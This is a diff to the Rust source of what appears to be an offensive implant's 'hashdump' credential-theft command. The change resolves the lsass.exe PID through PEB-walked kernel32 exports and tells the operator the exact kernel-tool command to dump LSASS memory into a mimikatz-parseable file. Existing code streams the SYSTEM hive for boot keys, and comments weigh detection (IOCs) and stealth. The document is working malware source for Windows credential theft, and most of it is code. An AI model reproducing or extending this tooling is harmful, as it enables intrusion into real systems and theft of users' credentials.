@@ -9,8 +9,11 @@
 //!     the full Python toolchain and isn't burning implant time on a multi-step
 //!     crypto dance that also balloons the binary.
 //!   - method 1: read the on-disk SYSTEM hive (the boot-key source) on its own.
-//!   - method 2: LSASS memory dump — explicitly deferred (louddest IOC); returns
-//!     an honest "deferred" Err so the operator isn't left guessing.
+//!   - method 2: LSASS memory dump — handled by the kernel-tier reader
+//!     (`nyx-kernel dump-lsass <pid>`). The implant returns an actionable
+//!     signal: the resolved LSASS PID + the exact command to run on the target.
+//!     The implant CANNOT dump LSASS itself (no_std PIC, no BYOVD, and userland
+//!     LSASS dump is the loudest possible IOC).
 //!   - method 3: macOS shadow hash — Windows 返回 unsupported（agent-dev 才支持）。
 //!
 //! LSASS memory dumping (`procdump`-style mini-dump of lsass.exe then offline
@@ -242,6 +245,41 @@ pub fn do_hashdump_vec(rt: Option<&'static Runtime>, method: u8) -> Vec<Response
             let sys = format_path(&sysroot, r"\System32\config\SYSTEM");
             unsafe { stream_file(rt, &sys, "SYSTEM") }
         }
+        2 => {
+            // LSASS memory dump via the kernel-tier reader. The implant CANNOT
+            // dump LSASS itself (no_std PIC, no BYOVD, and dumping LSASS from
+            // userland is the loudest possible IOC). The credential material
+            // is captured by the operator-side `nyx-kernel dump-lsass <pid>`
+            // (or `nyx-kernel --serve <port>` daemon) which uses the kernel
+            // DTB+page-walk reader and wraps the bytes in a minidump envelope
+            // (crates/minidump-assembler). Here we return an actionable signal:
+            // the LSASS PID (resolved via the process snapshot) + the exact
+            // command the operator should run on the target.
+            let lsass_pid = find_lsass_pid(rt).unwrap_or(0);
+            let msg = if lsass_pid == 0 {
+                String::from(
+                    "hashdump lsass: dump via the kernel-tier reader (implant cannot dump \
+                     LSASS — loudest IOC). Could not resolve LSASS PID; run `/ps` to find \
+                     lsass.exe, then on the target: `nyx-kernel dump-lsass <pid>` (or start \
+                     `nyx-kernel --serve <port>` daemon and the team server will fetch).\n",
+                )
+            } else {
+                let mut m = String::from(
+                    "hashdump lsass: dump via the kernel-tier reader (implant cannot dump \
+                     LSASS — loudest IOC). LSASS pid=",
+                );
+                push_decimal(&mut m, lsass_pid as u32);
+                m.push_str(
+                    ". On the target run: `nyx-kernel dump-lsass ",
+                );
+                push_decimal(&mut m, lsass_pid as u32);
+                m.push_str(
+                    "` — it produces a real .dmp (mimikatz-parseable via minidump-assembler).\n",
+                );
+                m
+            };
+            vec![Response::Output(msg.into_bytes())]
+        }
         other => {
             let mut e = String::from("hashdump: unknown method ");
             push_decimal(&mut e, other as u32);
@@ -267,6 +305,128 @@ fn push_decimal(s: &mut String, mut v: u32) {
     for &b in &tmp[i..] {
         s.push(b as char);
     }
+}
+
+/// Walk the process list via `CreateToolhelp32Snapshot` + `Process32FirstW`/
+/// `Process32NextW` and return the PID of `lsass.exe`, or `None` if not found
+/// or the kernel32 exports can't be resolved. Used by the method-2 arm to give
+/// the operator the LSASS PID in the actionable signal.
+///
+/// All kernel32 calls go through `crate::resolve::export_addr` (PEB walk).
+fn find_lsass_pid(_rt: &'static Runtime) -> Option<usize> {
+    type CreateToolhelp32Snapshot = unsafe extern "system" fn(u32, u32) -> *mut core::ffi::c_void;
+    type Process32FirstW = unsafe extern "system" fn(*mut core::ffi::c_void, *mut ProcessEntry32W) -> i32;
+    type Process32NextW = unsafe extern "system" fn(*mut core::ffi::c_void, *mut ProcessEntry32W) -> i32;
+    type CloseHandle = unsafe extern "system" fn(*mut core::ffi::c_void) -> i32;
+
+    const TH32CS_SNAPPROCESS: u32 = 0x00000002;
+    const INVALID_HANDLE_VALUE: *mut core::ffi::c_void = -1isize as *mut core::ffi::c_void;
+
+    let snap_addr = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CreateToolhelp32Snapshot") }?;
+    let first_addr = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"Process32FirstW") }?;
+    let next_addr = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"Process32NextW") }?;
+    let close_addr = unsafe { crate::resolve::export_addr(b"kernel32.dll", b"CloseHandle") }?;
+
+    let snap: CreateToolhelp32Snapshot = unsafe { core::mem::transmute(snap_addr) };
+    let first: Process32FirstW = unsafe { core::mem::transmute(first_addr) };
+    let next: Process32NextW = unsafe { core::mem::transmute(next_addr) };
+    let close: CloseHandle = unsafe { core::mem::transmute(close_addr) };
+
+    // SAFETY: CreateToolhelp32Snapshot with TH32CS_SNAPPROCESS returns a snapshot
+    // handle valid for the current process list.
+    let snap_h = unsafe { snap(TH32CS_SNAPPROCESS, 0) };
+    if snap_h.is_null() || snap_h == INVALID_HANDLE_VALUE {
+        return None;
+    }
+
+    let mut entry = ProcessEntry32W {
+        size: core::mem::size_of::<ProcessEntry32W>() as u32,
+        cnt_usage: 0,
+        pid: 0,
+        default_heap_id: 0,
+        module_id: 0,
+        cnt_threads: 0,
+        parent_pid: 0,
+        pri_class_base: 0,
+        flags: 0,
+        exe: [0u16; 260],
+    };
+
+    let mut found = None;
+    // SAFETY: snap_h is a valid snapshot handle; entry is a valid out-param.
+    if unsafe { first(snap_h, &mut entry) } != 0 {
+        loop {
+            // Compare entry.exe to "lsass.exe" case-insensitively (UTF-16).
+            if eq_utf16_ci(&entry.exe, b"lsass.exe") {
+                found = Some(entry.pid as usize);
+                break;
+            }
+            // Reset size (Process32* requires Size on every call per docs).
+            entry.size = core::mem::size_of::<ProcessEntry32W>() as u32;
+            // SAFETY: same handle; entry is a valid in/out-param.
+            if unsafe { next(snap_h, &mut entry) } == 0 {
+                break;
+            }
+        }
+    }
+    // SAFETY: close the snapshot handle.
+    unsafe { close(snap_h) };
+    found
+}
+
+/// Case-insensitive compare of a UTF-16 (NUL-terminated) buffer against an
+/// ASCII name. `name` is ASCII-only (we only use it for "lsass.exe").
+fn eq_utf16_ci(utf16: &[u16], name: &[u8]) -> bool {
+    let mut i = 0;
+    for &b in name {
+        if i >= utf16.len() {
+            return false;
+        }
+        let c = utf16[i] as u8;
+        if to_ascii_lower(c) != to_ascii_lower(b) {
+            return false;
+        }
+        if utf16[i] == 0 {
+            return false; // NUL before end of name
+        }
+        i += 1;
+    }
+    // After consuming all of `name`, the next UTF-16 unit must be NUL (exact match).
+    i >= utf16.len() || utf16[i] == 0
+}
+
+/// ASCII to-lower (handles A-Z only; other bytes pass through).
+fn to_ascii_lower(b: u8) -> u8 {
+    if (b'A'..=b'Z').contains(&b) {
+        b + 32
+    } else {
+        b
+    }
+}
+
+/// `PROCESSENTRY32W` (Win32) — what `Process32FirstW`/`Process32NextW` fill.
+#[repr(C)]
+struct ProcessEntry32W {
+    /// `dwSize` — MUST be set to sizeof(PROCESSENTRY32W) before the first call.
+    size: u32,
+    /// `cntUsage`
+    cnt_usage: u32,
+    /// `th32ProcessID` — the PID we want.
+    pid: u32,
+    /// `th32DefaultHeapID`
+    default_heap_id: usize,
+    /// `th32ModuleID`
+    module_id: u32,
+    /// `cntThreads`
+    cnt_threads: u32,
+    /// `th32ParentProcessID`
+    parent_pid: u32,
+    /// `pcPriClassBase`
+    pri_class_base: i32,
+    /// `dwFlags`
+    flags: u32,
+    /// `szExeFile[MAX_PATH=260]` — the process image name (UTF-16, NUL-term).
+    exe: [u16; 260],
 }
 
 /// Resolve `%SystemRoot%` via the PEB-walked environment (kernel32). Falls back
